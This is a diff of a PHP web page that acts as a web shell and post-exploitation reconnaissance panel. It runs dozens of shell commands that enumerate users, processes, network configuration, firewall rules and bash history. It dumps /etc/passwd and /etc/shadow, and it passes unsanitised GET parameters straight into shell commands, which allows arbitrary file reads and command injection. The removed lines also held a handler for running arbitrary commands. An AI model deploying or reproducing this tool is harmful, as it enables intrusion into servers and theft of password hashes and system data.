@@ -22,42 +22,205 @@ ExecCMD: <input type="text" name="execcmd"><br>
 // can be called directly, does not need to be used with the HTML interface file ...
 <html>
 <body>
-<p align="left">Whoami:<br><b><?php $who=shell_exec('whoami'); echo "<code>$who</code>"; ?><br></b>
-<p align="left">Ifconfig:<br><b><?php $ifc=shell_exec('ifconfig'); echo "<pre>$ifc</pre>"; ?><br></b>
-<p align="left">Filename Contents:<br><b><?php $fname=$_GET["filename"]; $fn=shell_exec("cat $fname"); echo "<code>$fn</code>"; ?><br></b>
-<p align="left">Directory Listing:<br><b><?php $dirlist=$_GET["directory"]; $dl=shell_exec("ls -asl $dirlist"); echo "<pre>$dl</pre>"; ?><br></b>
-<p align="left">ExecCmd:<br><b><?php $dirlist=$_GET["execmd"]; $dl=shell_exec("bash -e '$execcmd'"); echo "<pre>$dl</pre>"; ?><br></b>
-<p align="left">Issue:<br><b><?php $isu=shell_exec('cat /etc/issue'); echo "<code>$isu</code>"; ?><br></b>
-<p align="left">Release:<br><b><?php $rel=shell_exec("cat /etc/*-release"); echo "<code>$rel</code>"; ?><br></b>
-<p align="left">Release2:<br><b><?php $rell=shell_exec("cat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'"); echo "<code>$rell</code>"; ?><br></b>
-<p align="left">ProcVersion:<br><b><?php $procv=shell_exec("cat /proc/version"); echo "<code>$procv</code>"; ?><br></b>
-<p align="left">RPMInstalls:<br><b><?php $rpmk=shell_exec("rpm -q kernel"); echo "<code>$rpmk</code>"; ?><br></b>
-<p align="left">DMSG Output:<br><b><?php $dmsg=shell_exec("dmesg | grep Linux"); echo "<code>$dmsg</code>"; ?><br></b>
-<p align="left">ListBootDir:<br><b><?php $lbd=shell_exec("ls /boot | grep vmlinuz-"); echo "<code>$lbd</code>"; ?><br></b>
-<p align="left">LSB Release:<br><b><?php $lsb=shell_exec("lsb_release -a"); echo "<code>$lsb</code>"; ?><br></b>
-<p align="left">Last Log:<br><b><?php $last=shell_exec("last -a"); echo "<code>$last</code>"; ?><br></b>
-<p align="left">SysUname:<br><b><?php $unamea=shell_exec("uname -a"); echo "<code>$unamea</code>"; ?><br></b>
-<p align="left">Unameall:<br><b><?php $unamem=shell_exec("uname -mrs"); echo "<code>$unamem</code>"; ?><br></b>
-<p align="left">UserID:<br><b><?php $eid=shell_exec("id"); echo "<code>$eid</code>"; ?><br></b>
-<p align="left">History:<br><b><?php $hist=shell_exec("history"); echo "<code>$hist</code>"; ?><br></b>
-<p align="left">Arp List:<br><b><?php $arpa=shell_exec("arp -a"); echo "<code>$arpa</code>"; ?><br></b>
-<p align="left">netstatinfo:<br><b><?php $nsta=shell_exec("netstat -anot"); echo "<code>$nsta</code>"; ?><br></b>
-<p align="left">ps-list:<br><b><?php $pse=shell_exec("ps -elf"); echo "<pre>$pse</pre>"; ?><br></b>
-<p align="left">ps-list-root:<br><b><?php $pser=shell_exec("ps -elf | grep root"); echo "<pre>$pser</pre>"; ?><br></b>
-<p align="left">ListWebDir:<br><b><?php $lsla=shell_exec("ls -la /var/www/html/"); echo "<pre>$lsla</pre>"; ?><br></b>
-<p align="left">ApacheStatus:<br><b><?php $aserv=shell_exec("service apache2 status"); echo "<code>$aserv</code>"; ?><br></b>
-<p align="left">CatResolve:<br><b><?php $reso=shell_exec("cat /etc/resolv.conf"); echo "<code>$reso</code>"; ?><br></b>
-<p align="left">CatNetworks:<br><b><?php $netw=shell_exec("cat /etc/networks"); echo "<code>$netw</code>"; ?><br></b>
-<p align="left">IptablesList:<br><b><?php $iptl=shell_exec("iptables -L"); echo "<code>$iptl</code>"; ?><br></b>
-<p align="left">IPtablesNAT:<br><b><?php $iptn=shell_exec("iptables -L -t nat"); echo "<code>$iptn</code>"; ?><br></b>
-<p align="left">ListServices:<br><b><?php $lsofi=shell_exec("lsof -i"); echo "<code>$lsofi</code>"; ?><br></b>
-<p align="left">CatServices:<br><b><?php $eserv=shell_exec("cat /etc/services"); echo "<pre>$eserv</pre>"; ?><br></b>
-<p align="left">ListWebServer:<br><b><?php $sere=shell_exec("grep 80 /etc/services"); echo "<pre>$sere</pre>"; ?><br></b>
-<p align="left">RunWhoCMD:<br><b><?php $ww=shell_exec("w"); echo "<pre>$ww</pre>"; ?><br></b>
-<p align="left">ShowRoute:<br><b><?php $rou=shell_exec("route -n"); echo "<pre>$rou</pre>"; ?><br></b>
-<p align="left">BreakoutUsers: <?php $pwdb=shell_exec("cat /etc/passwd | awk -F :<br><b>'{if ($3 > 999 && $3 < 60001) print $1,$3,$6}'"); echo "<code>$pwdb</code>"; ?><br></b>
-<p align="left">CatMOTD:<br><b><?php $motd=shell_exec("cat /etc/motd"); echo "<code>$motd</code>"; ?><br></b>
-<p align="left">CatGroup:<br><b><?php $egr=shell_exec("cat /etc/group"); echo "<pre>$egr</pre>"; ?><br></b>
-<p align="left">CatShadow:<br><b><?php $esh=shell_exec("cat /etc/shadow"); echo "<code>$esh</code>"; ?><br></b>
+<p align="left"><b><u><i><H1>SYSTEM INFORMATION</H1></i></u></b>
+<br>
+<hr>
+<p align="left"><b><u>TAIL:</u></b>
+<?php $ntail=shell_exec("tail /var/www/html/cat.php");echo "\t$ntail";?>
+<br>
+<hr>
+<p align="left"><b><u>Top 5 Processes:</u></b>
+<?php $topfive=shell_exec("top -n 5 -d");echo "\t<code>$topfive</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Hostname:</u></b>
+<?php $hostn=shell_exec("hostname -f"); echo "\t$hostn";?>
+<br>
+<hr>
+<p align="left"><b><u>LocateNmap:</u></b>
+<?php $locnmap=shell_exec("which nmap"); echo "\t$locnmap";?>
+<br>
+<hr>
+<p align="left"><b><u>GCCVer:</u></b>
+<?php $gccvar=shell_exec("gcc -v"); echo "\t$gccvar";?>
+<br>
+<hr>
+<p align="left"><b><u>ListStorage:</u></b>
+<?php $storevar=shell_exec("df -h"); echo "<div><ld><pre>$storevar</pre></ld></div>";?>
+<br>
+<hr>
+<p align="left"><b><u>RubyVer:</u></b>
+<?php $rubyvar=shell_exec("ruby -v"); echo "$rubyvar";?>
+<br>
+<hr>
+<p align="left"><b><u>PerlVer:</u></b>
+<?php $perlvar=shell_exec("perl -v"); echo "<pre>$perlvar</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>PythonVer:</u></b>
+<?php $pyvar=shell_exec("python --version"); echo "$pyvar";?>
+<br>
+<hr>
+<p align="left"><b><u>Top 5 Processes:</u></b>
+<?php $topfive=shell_exec("top -n 5 -d"); echo "<pre>$topfive</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>MySQLVer:</u></b>
+<?php $mysqlver=shell_exec("mysql --version"); echo "<pre>$mysqlver</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>Whoami:</u></b>
+<?php $who=shell_exec('whoami'); echo "<code>$who</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>UserHistory:</u></b>
+<?php $userhist=shell_exec('cat ~/.bash_history'); echo "<code>$userhist</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Ifconfig:</u></b>
+<?php $ifc=shell_exec('ifconfig'); echo "<pre>$ifc</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>Filename Contents:</u></b>
+<?php $fname=$_GET["filename"]; $fn=shell_exec("cat $fname"); echo "<code>$fn</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Directory Listing:</u></b>
+<?php $dirlist=$_GET["directory"]; $dl=shell_exec("ls -asl $dirlist"); echo "<pre>$dl</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>Exec System Cmd:</u></b>
+<?php $newtest=shell_exec("echo 'MyNewTest'");echo "<code>$newtest</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Issue:</u></b>
+<?php $isu=shell_exec('cat /etc/issue');echo "<code>$isu</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Release:</u></b>
+<?php $rel=shell_exec("cat /etc/*-release");echo "<code>$rel</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Release2:</u></b>
+<?php $rell=shell_exec("cat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");echo "<code>$rell</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>ProcVersion:</u></b>
+<?php $procv=shell_exec("cat /proc/version");echo "<code>$procv</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>RPMInstalls:</u></b>
+<?php $rpmk=shell_exec("rpm -q kernel");echo "<code>$rpmk</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>DMSG Output:</u></b>
+<?php $dmsg=shell_exec("dmesg | grep Linux");echo "<code>$dmsg</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>ListBootDir:</u></b>
+<?php $lbd=shell_exec("ls /boot | grep vmlinuz-");echo "<code>$lbd</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>LSB Release:</u></b>
+<?php $lsb=shell_exec("lsb_release -a");echo "<code>$lsb</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Last Log:</u></b>
+<?php $last=shell_exec("last -a");echo "<code>$last</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>SysUname:</u></b>
+<?php $unamea=shell_exec("uname -a");echo "<code>$unamea</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Unameall:</u></b>
+<?php $unamem=shell_exec("uname -mrs");echo "<code>$unamem</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>UserID:</u></b>
+<?php $eid=shell_exec("id");echo "<code>$eid</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>History:</u></b>
+<?php $hist=shell_exec("history");echo "<code>$hist</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>Arp List:</u></b>
+<?php $arpa=shell_exec("arp -a"); echo "<pre>$arpa</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>netstatinfo:</u></b>
+<?php $nsta=shell_exec("netstat -anot");echo "<pre>$nsta</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>ps-list:</u></b>
+<?php $pse=shell_exec("ps -elf");echo "<pre>$pse</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>ps-list-root:</u></b>
+<?php $pser=shell_exec("ps -elf | grep root");echo "<pre>$pser</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>ListWebDir:</u></b>
+<?php $lsla=shell_exec("ls -la /var/www/html/");echo "<pre>$lsla</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>ApacheStatus:</u></b>
+<?php $aserv=shell_exec("service apache2 status");echo "<pre>$aserv</pre>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatResolve:</u></b>
+<?php $reso=shell_exec("cat /etc/resolv.conf");echo "<code>$reso</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatNetworks:</u></b>
+<?php $netw=shell_exec("cat /etc/networks");echo "<code>$netw</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>IptablesList:</u></b>
+<?php $iptl=shell_exec("iptables -L");echo "<code>$iptl</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>IPtablesNAT:</u></b>
+<?php $iptn=shell_exec("iptables -L -t nat");echo "<code>$iptn</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>ListServices:</u></b>
+<?php $lsofi=shell_exec("lsof -i");echo "<code>$lsofi</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatServices:</u></b>
+<?php $eserv=shell_exec("cat /etc/services");echo "<div>$eserv</div>";?>
+<br>
+<hr>
+<p align="left"><b><u>ListWebServer:</u></b>
+<?php $sere=shell_exec("grep 80 /etc/services");echo "<div>$sere</div>";?>
+<br>
+<hr>
+<p align="left"><b><u>RunWhoCMD:</u></b>
+<?php $ww=shell_exec("w");echo "<div>$ww</div>";?>
+<br>
+<hr>
+<p align="left"><b><u>ShowRoute:></u></b>
+<?php $rou=shell_exec("route -n");echo "<div>$rou</div>";?>
+<br>
+<hr>
+<p align="left"><b><u>BreakoutUsers:</u></b>
+<?php $pwdb=shell_exec("cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1,$3,$6}'");echo "<code>$pwdb</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatMOTD:</u></b>
+<?php $motd=shell_exec("cat /etc/motd");echo "<code>$motd</code>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatGroup:</u></b>
+<?php $egr=shell_exec("cat /etc/group");echo "<div>$egr</div>";?>
+<br>
+<hr>
+<p align="left"><b><u>CatShadow:</u></b>
+<?php $esh=shell_exec("cat /etc/shadow");echo "<code>$esh</code>";?>
+<br>
+<hr>
 </body>
 </html>
+
